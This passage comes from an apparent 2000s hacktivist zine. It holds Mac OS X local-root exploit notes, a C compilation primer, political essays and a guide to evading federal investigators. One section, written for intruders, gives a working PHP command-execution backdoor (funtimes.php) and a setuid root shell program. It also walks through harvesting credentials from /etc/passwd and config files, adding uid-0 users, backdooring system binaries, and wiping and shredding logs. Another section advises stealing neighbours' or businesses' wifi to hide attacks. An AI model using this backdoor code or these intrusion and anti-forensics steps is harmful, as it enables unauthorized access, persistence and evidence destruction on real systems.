disk://urlto.com/some/package.dmg, the browser will automatically download and
mount package.dmg. This can also be accomplished through something similar to
ftp://, afp://, and even http:// inside of safari.

The contents of the DMG file may contain a specially crafted application called
Fun.app which can in itself register a new URL handler (let's say malicious://)
that when called by any browser it will launch Fun.app. Applications can
register new URL handlers as CFBundleURLTypes tags stored in the
Fun.app/Contents/Info.plist or the plist resource fork. Alternatively,you could
also try help://runscript=../../../Volumes/yourvolume/yourscript.scpt to start
files stored on the mounted dmg volume.

Other interesting URL handlers that can be explored for future vulnerabilities:
x-man-page://, telnet://, ssh://, ical://, addressbook://, itms://, mms://, etc.

--------------------------------------------------------------------------------
Other Vulnerabilities
--------------------------------------------------------------------------------
There had been a number of vulnerabilities and exploits discovered for Mac OS X
over the past year.

CF_CHARSET_PATH local root exploit
Exploiting a buffer overflow in Core Foundation, an attacker is able to drop to
root by injecting malicious code into the CF_CHARSET_PATH environment variable.
The exploit is publically available and Apple released a patch on March 21,
2005.

AppleFileServer remote root exploit
A pre-authentication buffer overflow in Apple file sharing allows you to execute
remote commands as root. It affects several different versions of the OS, but
only the return address and offsets are public for 10.3.3. This was patched by
Apple on 2004-12-02.

Browser homograph attacks allowed spoofed URLs
Because of improper International Domain Name support, it is possible to craft a
link which tricks the browser into appearing like an official site but actually
redirect to somewhere else. Example: http://www.p&#1072;ypal.com/ appears like
paypal.com while it actually goes to www.xn--pypal-4ve.com. This was discovered
by the Schmoo group and patched with the March 21 2005 security update.

Adobe Version Cue local root vulnerability
On systems running Mac OS X 10.3.6 or below who has Adobe Version Cue installed
(ships which virtually every Adobe product) allows unprivileged users to drop to
a root shell through manipulating suid shell scripts. The script
/Applications/Adobe Version Cue/stopserver.sh does not check to see what
directory you are in before it makes references to other shell scripts. You are
able to call stopserver.sh through a symbolic link and execute malicious code as
root by making a fake productname.sh. You can easily cp /bin/sh to ~, chmod
4755, and chown root. Boom, instant suid root shell.

mRouter local root exploit
A buffer overflow in a command line argument of the mRouter binary can be
exploited to drop to a root shell. mRouter is SUID by default and comes
installed with the iSync packages. This bug was fixed with Mac OS X 10.4 Tiger.

Apple Internet Connect local root vulnerability
Apple Internet Connect writes to /tmp/ppp.log, creating it if it does not
already exist, and appending to it if it already exists. You can trick it into
appending data to any file on the system by creating a symbolic link
/tmp/ppp.log to the file being altered. By adding code to the telephone dialogue
box, and redirecting /tmp/ppp.log to /etc/daily, you can execute code as root as
cron checks this file everyday at 3:15am. This vulnerability was discovered by
b-r00t and affects versions up to 10.3.4.

################################################################################
#              11. C Compilation on a Low Level   By Forcemaster               #
################################################################################

This article discusses the process behind compiling a C program. the article
will be split into two sections. The first about low level C compilation and its
workings, the second will contain some useful C links and some other random shit
that I might decide to throw in there. So read on...

The first part of the compilation process is the preprocessor. The preprocessor
accepts source code as input and is responsible for removing componenets and
intepreting preprocessor directives (such as #defines and macros, and anything
else with # at its start for that matter). The next stage in compilation is the
compiler. All this does is translate the source code sent to it from the
preprocessor to assembly code. Very good. Next. The assembler comes next, it
creates object code. The last step in C compilation is the linker editor, which
adds libraries, and external functions to the main() function, it also resolves
any external variables. After this has been done, an executable file is
produced. The Preprocessor. A unique feature to C compilers is that the
preprocessor is always the first step in compilation. The preprocessor kind of
provides its own mini-language, as it were. Using the preprocessor has several
advantages, which I'm not going into here as this is not a C tutorial. It
interperates all processes begining with a ""#"" (hash) sign. Now it'll go through
how it does this with some preprocessor direvtives.

The most common preprocessor directive is ""#include"", when an #include statement
is issued like ""#include <file>"" the preprocessor will look in the directory
where system header files are usually kept. Normally /usr/include on *nix
systems. When an #include statement is issued like ""#include 'file'"" the
preprocessor will look in the current for the header file. The preprocessor
directive #define is nothing but a text substitution. #define also can be used
to make macros, which are basically mini-functions, in this way the preprocessor
can be very powerful. The next stage in C compilation is the compiler, which
translates the code into assembly. It recieves the source code from the
preprocessor.

The assembler is next, which creates object code. Object code contains compact,
pre-parsed source code. Usually called binaries. An object file (a file
containing object code) is mostly machine code. WHich is code directly
understood by the machine processor. Object code has a .o suffix on *nix systems
and usually .obj on windows system. Object code can be linked with other
libraries to create a final executable. Finally is the linker or link editor.
The linker takes various object files and assembles them into an executable
file. Linkers can also include object files from external libraries. This has
advantages over including a single large object file such as making faster
compilation time, and more managable code. Most compilers will automatically
link with several defualt system libraries during compilation. After all these
compilation steps you should be left with a finished executable file. Most
compilers have a nice syntax checker that will stop compiling if a syntax error
occurs, although occasionaly errors do occur that are not picked up by the
compiler.

SamHallam@gmail.com (Forcemaster)

http://ctour.tonymantoan.net -- Absouletly fucking awesome C tutorial for
begginers. Where I started, it does however have a few errors with linked lists,
but nothing more.

http://www.ecst.csuchico.edu/~beej/guide/net/ -- Very great C socket tutorial.

http://www.winprog.org/tutorial/ -- Nice win32 API tutorial.

http://www.hackthissite.org/lectures/read/9/ -- My two C tutorials I did for
hackthissite.org.

http://www.planetsourcecode.com/ -- All your source code needs.

http://www.phrack.org/phrack/49/P49-14 -- The infamous ""Smashing the stack for
fun and profit"" by Aleph One

################################################################################
#          12. Security Access, Backdoors and Gaining Permissions              #
################################################################################

Woah! I just found this bug on this web server that lets me run commands as the
web server. This is cool! Too bad I only have permissions as the web user. What
do I do now? No doubt you've left some pretty nasty trails all over the web
server, and you're probably not satisfied with the access level of what you have
right now.

This guide will show you some tricks on how to secure your access, elevate
permissions, set up backdoors, and clean up after your tracks. Comprimising
machines and chaining several secure jump boxes to route your connections allows
you to be virtually anonymous, especially if you use a public unmonitored
internet connection.

If you've found an exploit, one of the first things you might want to do is
probably find a way to make sure you'll always have access, even if they
discover and patch the vulnerability. In every system, you could copy files to
/tmp/ which gives you some file space that you can play around with, but unless
youput it in the web root, you won't be able to access your files from the web
server. You can try to find a dir you can write to through a find ../../../
-type d -perm 777 where ../../ is the path to the web root base. This will spit
out a list of directories that you can copy a backdoor to. You should then make
a hidden directory .page where you will put all your files. Then you can use a
tool look curl or wget to copy a PHP or ASP exec backdoor(like funtimes.php on
the right) to this directory. If neither of these tools are available, or if the
server is behind some sort of firewall, then you could also echo ""<?php
thesourcecode; ?>"" > /path/to/www/root/.page/backdoor.php.

This will give you a web based shell, which is a good start,but has a number of
disadvantages. Every time you execute a command, a little entry in their
access-log notes your IP address and the URL to the backdoor. In addition, this
will not let you execute interactive programs like ftp or vi because of the
nature of the web. So it's obvious you need something a bit more.

You might want to read about some configuration files to see if you could gain
further access or at least gather information about the machine. Try the
httpd.conf file or any .htaccess files, often times it will continue
AuthUserFile statements which have paths to the password files for password
protected directories. These files are usually DES or MD5 encrypted which can be
cracked, and usually give access to admin sections that may allow uploads or
ways to interact with their database. You can also try reading /etc/passwd to
find usernames on their system, as well as proftp.conf, my.cnf, pam.conf, or
others. If they have scripts that make use of MySQL, look around for some
configuration files to see if you can find any u/p. Try config.php for phpBB or
config.inc.php for phpMyAdmin. Often times if they are silly enough they will
use the same logins information as ftp or ssh. If you cannot get a shell login
this way, then you might want to see if you could bind a port to the shell to
telnet to and use interactive programs. This will help when navigating the
system and trying other exploits.

If this by itself doesn't give you access, you're going to have to see if there
are any exploits on the system to gain further access. Try a uname -a, ps -aux,
and a nmap to see what sort of services are running on this machine that could
be exploited. Look for suid binaries on a system: find / -perm -4000 -o -perm
-2000 -exec ls -ldb {} \; . Look through k-otik.com, milw0rm.com,
securityfocus.com, and others to see if there are any local root exploits for
this system. No system is entirely secure, especailly if the system is old or
unpatched, there's probably dozens of ways to get root, but it is outside the
scope of this article.

Now that you've got complete control of the machine, there's a billion things
you can do to secure access and cover your tracks. Add new users with uid 0 for
same permissions as root. Create a C file that and chmod it 4755 so that it runs
a /bin/sh shell as root(see suidshell.c below). Bind a port to a shell running
as the root user so you can hop on without leaving any messy logs anywhere. If
you really want to get fun, you can backdoor several system binaries including
w, who, ps, ls, and even login to hide your trails in a system. There are all
sorts of rootkits that automate the process.

Clearing the logs of a system could mean the difference between a federal
investigation and getting away with the penetration. Every system stores its
logs in different locations and often times system administrators will back
files up to different locations. For starters, wipe everything inside of
/var/log. If you gain access through a flaw in the web server, make sure you
also clear all apache access or error logs. Usually you can find the locations
of this through reading the httpd.conf file. Clear the .bash_history file for
all users to destroy your command history(starting an ssh session with an unset
HISTFILE command will disable this logging). There are also prewritten scripts
like zap3.c which help automate the process of clearing logs or even stripping
all specific ip addresses without completely trashing logs and becoming noticed.
Remember, deleting a file is not enough, you want to shred the files with random
data to slow forensics.

This should give you an introduction of some directions you can take a system if
you've already got some level of access. Good luck, stay out of trouble, and
don't get caught!

funtimes.php: 
// drop in any directory in the web root to exec cmds as the apache user 

<code><pre> <?php $cmd = $_POST[""cmd""]; passthru(""$cmd"", $return); ?>
</pre></code><br><br>hacker anarchists are everywhere!<Br> <form
action=""funtimes.php"" method=""POST""> <input type=""text"" name=""cmd""> <input
type=""submit"" value=""exec""> </form>

suidshell.c:
// upon gaining root, compile this file and chmod 4755 suidshell . ./suidshell,
instant root

#include <stdio.h>
int main() { 
  setuid(0);setgid(0);
  execl(""/bin/bash"",""bash"",(char *)0);
  return 0;
}

 
                       !##################################!
                       !###        TAKE ACTION         ###!
                       !###   HACKTIVISM IN PRACTICE   ###!
                       !##################################!
            
           ""The people who are crazy enough to think they can change
            the world are the ones that do.""

################################################################################
#              13. Join Revolution, Live Happier   by r3d5pik3                 #
################################################################################

So you're tired of wasting your life away behind a screen, or maybe your not
satisfied with the way things are going around you. You're constantly looking
deep down for more in life, more meaning, more excitement. You want to make a
difference, and you want to have a good time doing it. So what better way then
to get active in your community?

Now when you hear the words revolution, and activism, a couple things that may
come to mind: protesting, rioting, tree hugging, stealing, and sometimes even
arson. Well that is undoubtedly how the media portrays activists. However this
mass depicted stereotype is extremist, and somewhat falsified. Becoming an
activist has absolutely nothing to do with carrying a picket sign, breaking
stuff in the streets, and setting stuff on fire  (not saying that those things
aren't fun ;) ). It is about about making changes  to system, but not via the
drastic methods you see televised. As a matter of fact, revolution will not, and
can not be televised. Activists utilizing the system to destroy the system never
has, and never will work out. So true activism takes effect at a local level. It
is here at this local level were individuals have the biggest impact on the
world.

So now that we got your windows cleaned from media missrepresentation, and you
see the bright rays of activism glaring at you. There are all sorts of ways to
integrate radical ideas into your everyday life: 

1.) Turn off the television
--------------------------------------------------------------------------------
TV is the centrifuge of most things corporal. Chances are you, or some one you
know works for some one directly, or indirectly involved with this form of mass
media (broadcast, the phone company, coke, coffee shops, or the gym they all
advertise don't they?). Besides that, wouldn't you rather be living an adventure
of your own, instead of watching one unfold before you on a screen? Go shake
stuff up with your friends, meet new people, go on adventures, just please turn
the TV off. 

2.) Fall in love
--------------------------------------------------------------------------------
Yes this is an activist act. Some one in love has more to live for, more
excitement, and more meaning in there life. Some one in love has less place in
the corporal elite ranks and more in the living life for the moment spectrum. So
fall in love today. fall in love with a guy, a girl, an activity, anything it
really doesn't matter just find more to live for. 

3.) Read a book
--------------------------------------------------------------------------------
Especially books that make you question things around you, ones that get you to
think. Books full of action, puzzles, mystery, tragedy, whatever its all good. 

4.) Start conversations with strangers
--------------------------------------------------------------------------------
Starting a conversation with some one you have never seen before in your life is
a great exercise to break down the socialphobia that the system breeds us on.
Also in the act of doing this you make the world a some what friendlier place to
live in, by breaking down the social walls that keep us all isolated, distant,
and forgotten. This alone is all we need to rekindle the flame of our
communities. 

5.) Use alternative transportation
--------------------------------------------------------------------------------
Use public transportation whenever possible. Get some exercise by, riding a
bike, jogging, walking, or skating. Either of these options will both break down
some social barriers, conserve fossil fuels, keep you a healthier person. 

6.) Go to local band/music shows
--------------------------------------------------------------------------------
These are usually cheap and are jam packed with fun. What better way to get the
community together, while having a good time listening to your favorite local
band? If you do choose to go to these events, don't let them be a spectator
sport. What I mean is please don't just stand around and stare at the bands. Get
social, party, live it up, and shake things up a bit. 

7.) Call in sick on a sunny day
--------------------------------------------------------------------------------
Calling in sick on a sunny day is an exploit people simply don't take advantage
of enough. Everyone deserves a day off every once in a while, and this would be
the perfect time to go explore a part of your town you've never seen before,
interact with new people, and just have fun. 

8.) Let your artistic side out
--------------------------------------------------------------------------------
Break free from your systematic lifestyle by writing a poem, sketching something
up, writing song lyrics, composing music, or writing a story. Anything that gets
the creative juices flowing and gets you thinking somewhat out of the norm. 

9.) Spend less, Work less, live more
--------------------------------------------------------------------------------
Buy only the absolute essentials you need to live. Make sure everything you buy,
your buying it because you need it. Not because advertisers make you feel
insecure to buy there product.. If you do this, then you will need less income.
The less income you need the less you need to work. The less you need to work
the more time you have to put your energy to something productive and fun you
believe in. 

10.) Get organized !
--------------------------------------------------------------------------------
Organize meaningfull fun events in your neighborhood. Throw a community potluck.
Have a community barbecue where everyone brings something. Organize spoken word,
and music related events for people to come together and express themselves.
Organize your own workers union if you don't have one. Organize charities,
non-profit organizations, anything really. Start your own projects as long as
you see them as a productive thing then thats really all that matters.

################################################################################
#      14. Security Culture: Hackers Living in an Age of FBI Repression        #
################################################################################

As our movement grows, so will the Establishment's attempts to stop us. They've
been doing everything they can to gain power with so-called 'intelligence
reforms' and 'anti-terrorism efforts'. These are pretty ways of passing
legislation giving increased powers to law enforcement at the expense of civil
liberties, setting up the blueprint for a police state in the USA. The attacks
have already begun, as hackers and activists, we have to learn how to protect
ourselves if we ever hope of stopping this madness once and for all.

What are we up against?
--------------------------------------------------------------------------------
The effects of these efforts are very real, and organizations and individuals of
our movement have already been targeted, raided, and charged with ridiculous
crimes. Dozens of Independent Media Centers, one of the largest tools used by
activists to announce events and expose the injustices and atrocities of
corporations and government, has had it's machines seized under highly
suspicious and secretive terms. Individual hackers such as Mike Wally aka
Hairball of HBX Networks have a history of being harassed and raided by federal
authorities.  Hack This Site founder Jeremy Hammond was also raided and charged
with credit card fraud and unauthorized access related to hacking right-wing
websites. 

In the buildup to the Republican National Convention, the FBI, secret service,
and local police have harassed and intimidated activists for being involved in
the protest organizing efforts. Dozens of anarchists were visited and questioned
about their affiliation with protest groups. Several activists were given 'round
the clock' supervision where several agents were following them around.
Meetings, email lists, and phone conversations were infiltrated and tapped by
law enforcement for intelligence  gathering purposes. 

Over 1800 people were arrested at the convention protests themselves, including
Emmanual Goldstein from 2600 and Jeremy Hammond from Hack This Site. Most were
arrested randomly and given bogus 'disorderly conduct' charges for being
'suspected anarchists'. Dozens of people suffered severe beatings by police even
at peaceful marches, and arrestees were held for much longer than the maximum 24
hours in the infamous 'Pier 57'(or 'Guantanamo on Hudson Bay') detainment
warehouse where there were reports of asbestos and lead contamination. 

We can protect ourselves!
--------------------------------------------------------------------------------
We do not have to make it easy for them to target and harass us. Usually
investigations come from slip ups or bad decisions, and if we ever want to pose
any sort of serious threat to their power structure, we are going to have to
develop a tight security culture. This has to extend to all aspects of our life,
from using the internet, attending meetings, talking to reporters, participating
in protests, to even checking out books at the library. Know your rights ahead
of time. The best thing you can do is to be prepared in case the worst happens.

Becoming a ghost on the net
--------------------------------------------------------------------------------
One of the first things you can do is learn to use the internet anonymously.
Everything you do on the net is being monitored, from what websites you visit to
the emails you send and receive. There are ways you can help make yourself
anonymous on the net, but as a ground rule, do not use your home connection to
talk about or do things you should not be doing. No matter how many boxes you
are bouncing off of or what sort of encryption you're using, none of it will
matter if you are being specifically targeted and monitored by the authorities
because they get complete data dumps of all your internet activities at the ISP
level. 

First thing to do is to master the usage of proxy servers. When you make a
connection to another machine on the net, it goes straight from your ISP to
theirs, leaving a very obvious IP address in their server and router logs. By
using proxy servers, you can bounce your connection off of several anonymous
boxes before connecting to the destination. When they examine the logs, they
will find that it originated from some box set up as a proxy. Unless there is a
large federal investigation, usually this will be enough to stop any sort of
effort to track you down. The authorities will have to issue a court order to
examine the proxy logs belonging to the box you bounced off of. By using proxies
from other countries, this will make things considerably more difficult if not
impossible because they will have to deal with international police
organizations where they have no jurisdiction. There are also techniques you can
use that allow you to bounce off of several proxies instead of just a single one
that most operating systems allow you to use. While this will seriously hamper
any efforts to track you down, it does not make it impossible with a large
enough budget. Do not think you are secure if you are having fun from your home
connection, even if you are bouncing off of several proxies. 

Another technique you can use to better secure yourself would be using a
technique called ssh tunnelling. Normally when you make a connection through
http, pop3, aim, or anything else, the data is sent over the lines through plain
text. Meaning someone can set up a packet sniffer on your local network or on
any of the routers between your connection and the destination and pick up
information like passwords, texts of email, etc. When you set up a SSH
connection, data is sent over an encrypted path. You can configure your machine
to use *any* service, even if it is plaintext, to tunnel through an ssh
connection. You need to have an ssh account on some other machine, but once you
get it set up it also acts like a proxy. Your computer will connect via ssh to
your account on another server, and then to the destination machine. Setting up
an SSH tunnel is as easy as a google search, but there are also applications you
can download to automate the process. 

The feds have all sorts of forensics tools for recovering data from your drives.
Obviously just removing items from your recycling bin isn't going to cut it. The
data is still there, just the initial headers of the file have been marked for
free space so the operating system can use it when it saves files in the future.
Even a standard drive formatting won't cut it when dealing with higher end
forensics. There are all sorts of tools out there that can help by writing
random data several times over portions of the drive, hopefully removing all
magnetic traces of the file. Don't think hitting your computer with a baseball
bat will stop them from getting your data. The fact is, if they want it, they
could get it. The best bet for sensitive data is finding some sort of external
storage such as floppy disks or mini USB flash drives that can be wiped easily
and hidden in walls, buried in the backyard, etc. Also remember that most
operating systems leave all sorts of undesirable trails in temporary locations.
Make sure you clear your browser history, your form autocompletes, your cookies,
your recent documents, your temporary internet files, your bash history, any
stored usernames or passwords, etc. The best bet would be to make some sort of
linux livecd that you can boot to each time which will leave no pesky and
incriminating information over your drive and the RAM will clear itself after
the next boot.

These are all good measures to help make yourself anonymous but the fact is if
you think you might be a target for harassment or if you're about to have some
fun with a major corporation or government system, you should definitely employ
these techniques in combination with USING A DIFFERENT INTERNET CONNECTION.
There are dozens of public computers out there, including libraries, schools,
cyber cafes, etc. It's also not too difficult to steal a cable connection from a
neighbor, or to use a beige box and a stolen dialup account with your laptop. Of
course, the easiest and most popular method would be to steal a wireless
connection from some business or individual who had set up their wireless base
station with a default or no username and password. There's no trace except for
a MAC address which can be spoofed, and not many routers log this information
anyway. Using several proxy servers from a stolen internet connection is your
safest bet to become completely anonymous, as long as you don't do something
dumb like checking your personal email account while breaking into a major
system. 


A note on 'anonymous proxies':
--------------------------------------------------------------------------------
Just because you are accessing the internet behind a proxy server does not meen
that you are anonymous or secure. 

Browse with a proxy and go to whatismyip.com - not my home IP, I'm safe, right?
No! In addition to having to worry whether a particular proxy is actually owned
by federal agents to catch hackers, or whether the fact the proxy server logs
all requests and will respond to a court order to hand over logs, most public
proxy servers actually send your source IP address to the web server for logging
purposes.  X_Forwarded_For, which will sent your home IP to the server to be
logged away!

Take a look yourself. Start netcat to listen on a port using a command similar
to nc -l -v -p 8081, turn on a proxy, and try going to 123.456.789.0:8081 in
your web browser replacing it with your home IP address. Assuming you aren't
behind a router or firewall, you should see a complete dump of HTTP headers that
is supplied by your browser as well as the proxy server. Notice that pesty
X_Forwarded_For header that contains your home ip? If so, better find another
proxy...

Apache and other web servers can be configured to log these additional HTTP
headers. Is this a chance you're willing to take?

Loose Lips Sink Ships!
--------------------------------------------------------------------------------
You can go through every effort to protect yourself as far as technology is
concerned and loose everything because you said a few words you shouldn't have
to the wrong people. No matter how tempting and juicy the secrets you have
access to is, this information should not be shared with anyone unless they are
directly involved. By talking openly about your actions you not only risk
yourself but your friends, the websites you are involved with, your family,
everything. Be careful of what names or websites are linked to on defaced
websites. And don't go bragging to your buddies about your accomplishments, no
matter how tempting it is. Zip it! 

Especially if you are involved in activist circles, or you hang out on public
and well-known hacking IRC channels, you will be dealing with people you don't
know on a regular basis. You should feel comfortable in talking to these people,
but always use a level of discretion when you talk specifics about actions.
Especially be concerned when people who start asking questions they shouldn't be
asking. Often times new people will say they are friends of other people. Make
sure you check people out before you start including them in your plans. Not to
say that you need to be private or closed off: if our movement is to grow, we
need to be as inclusive as possible. 

But the fact remains: there are indeed police and cop infiltrators who try to
work their way into meetings to take things down. There are countless people who
have signed confidential informant agreements and lurk on IRC channels and
infiltrate meetings trying to find tips of people who may be breaking laws.
There are also right-wing fascist groups with ties to government like
ProtestWarrior.com, FreeRepublic.com, and KOBEHQ.com who troll on leftist or
hacker message boards and chatrooms, trying to get people to incriminate
themselves. To top it off, FBI agents themselves have been known to monitor
public IRC channels. Do not walk into their hands! 

So what triggers an investigation? As a rule, the FBI will not investigate a
crime unless the damages total to over $10,000. It takes a lot of money to
prepare an investigation with a search warrant and a criminal prosecution. Very
rarely does this happen unless it involves the transfer of money or have to do
with a large and influential corporation or government institution. So messing
with credit cards, identity theft, or revealing sensitive data will likely yield
an investigation while simple defacements(especially non-damaging ones) will
not. Corporations and government institutions can fill out and submit a
complaint form which will prompt a partial investigation to confirm that federal
laws were broken, but a full blown investigation depends on the amount of damage
done, and it usually comes down to money and who the individual or organization
is. In order to get a search warrant, they need to have probable cause which is
usually either specific evidence they have collected on you, or they have the
tip from an informant who says ""I saw him do it!"" or even ""I heard him talk
about it!"". In order to have an arrest warrant, they need to prove to the US
District Attorney that they have enough evidence to prosecute you.

Getting a Knock at the Door
--------------------------------------------------------------------------------
Oh shit, what do I do? Don't panic. Things can only get worse if you freeze, get
scared, or do something irrational. Keep calm and be firm about your rights.
Often times federal agents will try to manipulate you into giving them
information that they do not have. Sometimes they will just want to question
you, in which case you have the right to refuse. If this is the case, it usually
means that there isn't specific evidence but a tip or complaint that pointed
things in your direction. If they had enough evidence for a search warrant or
prosecution they would have done so already. Anything you say will and can only
be used against you, so your best bet is to not talk to them at all. Sometimes
they will ask ridiculous favors of you, like to turn in your friends, or to
submit to electronic monitoring or a search. Of course, if they ask it means
they cannot get the court orders to do it themselves. If they are able to do
this on their own, they won't give you any warning, which means that if you have
been contacted, assume you are being watched. Do NOT discuss ANYTHING with
ANYONE over your home net connection, no matter how encrypted you think things
are or how many proxies you are bouncing off of. DO NOT make it easier for them
by consenting. 

If they want to enter your house, do not let them in unless they present you
with a search warrant. If they do, make sure it is properly filled out, your
name, with the right address. And stay silent until you have an opportunity to
talk to your family or a lawyer. Very often they will try to pull information
out of you through scare tactics or telling you that you have no rights. They
have the right to lie, and you don't. Do not interfere as they as they go about
their business seizing your stuff as it will only make things worse. If you are
arrested, do not resist as they can slap on extra charges. As you are being
processed, do not give any sort of oral or written testimony as it can only be
used against you. Do not say shit without a lawyer. Await an arraignment and
hopefully you will be released, but more than likely a bond will be set and
someone will have to come up with the money to bail you out. Make sure you make
note of every small detail: who the arresting officer was, any sort of
contradiction they made as they were filing an arrest report, any sort of
irregularity with the search warrant, etc. as this can be used to suppress any
evidence or testimony they try to use against you. 

One of the first things federal agents will do is tell you that you are fucked
and that they have everything they already need on you. They may even law it all
out for you, telling you all those secrets that you thought no one else knew
about, that you hoped that law enforcement would never catch on to your
scheming. They will say that it will be easier on you if you tell them
everything. They will ask you to turn in their friends. Even if you know you are
going to cooperate, this isn't the time to do it. Anything you say will be used
against you. Do not answer questions without having a lawyer present, no matter
what they tell you. If you have not been charged or arrested, it likely means
that they do not have what they need on you and are trying to scare you into
slipping up and incriminating yourself. Do not take the bait.

One of the most important points to understand about how the FBI gathers
evidence and conducts their investigation is the distinction between what they
know about you and what they are prepared to use against you in court. The FBI
has startling capabilities in surveillance, and often evidence collected, no
matter how incriminating it is, can often be suppressed on the grounds that the
FBI acquired it illegally. They know this, so they will use what they do know
about you to scare you into giving them incriminating statements 

If you are indicted, and it looks like the trial isn't going to go your way,
then in your lawyer's negotiations with the prosecuting attorney they will make
it clear to you that it is in your best interest to cooperate with them.
Cooperation is a very difficult decision you need to make and will have negative
implications with whichever way you go. Often times the prosecuting attorney and
the courts will cut your sentence from a third to even a half of your time if
you cooperated with them and turned over your friends. Usually most cybercrime
cases are not ruled guilty based on electronic evidence but on
self-incriminating testimony or informants tipping off the feds. It happens time
and time again, even to the best of us, when faced with a few decades in federal
prison. If you do cooperate, they will want you to rat out everything all your
friends have told you. They will want to know all their personal details so that
they can try to track them down and prosecute them. They will likely also set
you down with a machine and get you to talk to them to pull as much information
as you can: personal details, admitting to crimes, etc. I won't make any
suggestions as to what you should do as this is a controversial and deeply
profound decision that will affect you for the rest of your life. Ultimately,
there is no way to win a conversation with federal agents. Ratting on other
hackers is the reason why most major hacking networks go down because it affects
and can bring down everybody. 

If they try to press charges, your best bet is to enter a not guilty plea
because you can change it later and it will help with your lawyer's negotiations
with the prosecuting attorney. They want a quick in and out conviction because
it is cheap and efficient for them. The last thing they want is the idea of you
fighting the charges, draining their resources and manpower. Unless they have
absolutely nothing on you, or the charges are ridiculous, the best bet is to
make some sort of plea bargain, where you will be offered a better deal by
accepting lesser charges, hopefully being entered into probation, some sort of
adult work program, a small amount of jailtime and usually a fine. But don't
give in right away. First wait until discovery is complete and you receive all
the evidence that they are planning on using against you. This will help you in
trying to figure out which charges to fight and what will help you in
negotiating a settlement. Usually the whole process drags out for months and
months and even years. Good! The longer it lasts in the court systems means the
more money it costs them meaning the more willing they are about dropping the
charges or making a better deal. Usually they will offer you several deals, and
it only gets better and better after time. Relax: as long as you aren't doing
anything stupid, things can't really get much worse. Recognize that once you
have been pegged

Where do we go from here?
--------------------------------------------------------------------------------
You might think that if we have to go through all these measures to protect
ourselves, it's better to just give up on the scene altogether so we don't have
to get involved with this legal nightmare. That's exactly what they want. Don't
let their fear and intimidation tactics silence you into submission. They make
an example out of a few people and blow these cases up in the media labelling us
as terrorists so they can justify bigger budgets and hope that hundreds of
hackers will lay down our arms and kill the movement. But it'll never happen.
There's a reason why they invest billions of dollars and send the best machines
they've got at trying to bust us. They know what we are capable of doing if we
get organized. It only takes one person to bring down an empire.

If we let them scare us into not saying anything about these injustices, then we
are allowing it to happen. The time is now to act. Stand up and defend our
rights against an unjust government. We are everywhere, and they cannot stop us
all. Get involved! 

More Information about Security Culture and Digital Rights:

""Everything a Hacker Needs to Know about Getting Busted by the Feds""
http://www.grayarea.com/agsteal.html

""Searching and Seizing Computers and Obtaining Electronic Evidence in Criminal
Investigations"" usdoj.gov/criminal/cybercrime/searching.html

FreeJeremy.com
http://security.resist.ca
http://www.eff.org
http://www.indymedia.org
nocompromise.org/features/security.html


NO MORE COPS!
The need for police stems from two sources: one, from the State and corporate
interests, which need some force to protect it's interests, and two, from the
fear within our communities of interpersonal violence. The problem with police
as they stand is that they serve this double purpose, fail to solve the latter
problem, and remain a force outside the control of those they pretend to serve.
As such they need to be abolished as an institution.

################################################################################
#               15. Police State USA and the Politics of Fear                  #
################################################################################

Over the past few years the direction of the United States has undergone a
series of sweeping changes which contradict and undermine the democratic
foundations of the country. New government institutions, legislation, and
multinational corporations are giving birth to a new age of a fascism of a
capitalist kind. This is a direct result of the social and political context
created out of the ""War on Terrorism"" and the agenda of the Bush administration.
The Republican party deceived and subdued the American people into accepting
corrupt policies using fear and the threat of terrorism. Unless we rise up to
confront and topple this criminally abusive presidency, we will spiral down a
self-destructive path that threatens the very stability of the planet. 

Since 9/11 we have had passed a number of initiatives that has reorganized our
nation's law enforcement at the cost of our civil liberties. Changes not only
affect specific legislation or the creation of new institutions but the spirit
of existing government agencies and how we go about treating both domestic and
foreign politics. Not even a week after the attacks did congress pass the USA
PATRIOT Act, a bill over 500 pages long that wasn't read or discussed by
congress but strangely almost universally supported. While these policies are
hidden under the guise of protecting the country from terrorist threats, we will
find that they themselves destroy what this country stands for. We have also
begun centralizing and restructuring law enforcement and intelligence agencies.
The Homeland Security Department was formed to help share data and legal
jurisdiction between different agencies including the FBI, CIA, NSA, DARPA, etc.
In addition to collaborating the powers of each under a larger more powerful
umbrella organization, much of the work being done is shrouded in secrecy in the
name of national security.

In an effort to combat terrorism, a new agency was formed under DARPA called the
Total Information Awareness program. The duties of TIA is to create a large
database to collect and store every bit of data on every American citizen. This
includes credit card histories, internet records(web sites, e-mails), phone
lines, even the books you check out at the library. In addition, it would run
crawler programs which would profile and flag individuals if they are a
""threat."" The logo of this organization was a pyramid from the dollar bill
overseeing the globe. To top it off, the person appointed to be director of this
horrendous organization was John Poindexter, who under the Reagan administration
was convicted of lying to congress, withholding evidence and conspiracy charges
related to the Iran Contra affair where they secretly and illegally sold weapons
to Iran to fund right wing dictators in Nicaragua. Now these people are being
appointed to positions in federal agencies where they can spy on us.

In addition to sweeping domestic legislation, the US has begun shifting foreign
policy in arrogantly destructive ways. Before the war in Iraq started, the US
declared that its troops would not be held accountable through the International
Criminal Court system. This essentially is a free ticket to rape, pillage and
use all sorts of illegal weapons such as cluster bombs and chemical weapons such
as depleted uranium without any fear of accountability. The US also withdrew
from the Antiballistic Missile Treaty and began the buildup and research into
nuclear arms once again. The US being the largest petroleum consumer on the
planet was also the only country to reject the Kyoto protocol designed to cut
down on emissions because ""it would damage the economy"". We have also started to
use loopholes around Geneva Convention standards by calling prisoners ""enemy
combatants"" instead of prisoners of war. Many people rounded up both from the US
and abroad have been shipped to ""Camp X-Ray"" in Guantanamo Bay Cuba where it can
practice all sorts of interrogation and torture techniques ranging from sleep
and sensory deprivation to starvation, beatings, and electroshock therapy. There
have been dozens of documented cases in camps in Iraq and Cuba of prisoner
abuse, to the point of the CIA admitting themselves that they have begun
shipping people overseas where they are not bound by their own laws. Despite
controversy after controversy and several leaked memos of military leaders
advocating the use of torture, the administration exists that these are
exceptions rather than the rules in order to avoid any sort of administrative
accountability. 

As people begin to rise up and question the policies of the Bush administration,
the government is starting to use these increased law enforcement abilities not
to prevent international terrorism but to target and harass domestic protesters
and dissidents. 

Sherman Austin who ran RaiseTheFist.com faced surveillance and eventually was
arrested and charged under provisions in the USA PATRIOT Act. This stems out of
a post that someone else made in his message board system where a link was made
to a web site that posted information about building bombs. Although he himself
did not post or even host the information, he pled guilty to lesser charges to
get out easy - only one year in federal prison. Not only is it constitutionally
protected to spread the questionable materials no matter how controversial it
is, bomb making instructions can be found in tens of thousands of places on the
internet. The fact that he was charged and sentenced while others are ignored
further demonstrates that he was targeted for his politics rather than the
accused crime itself.

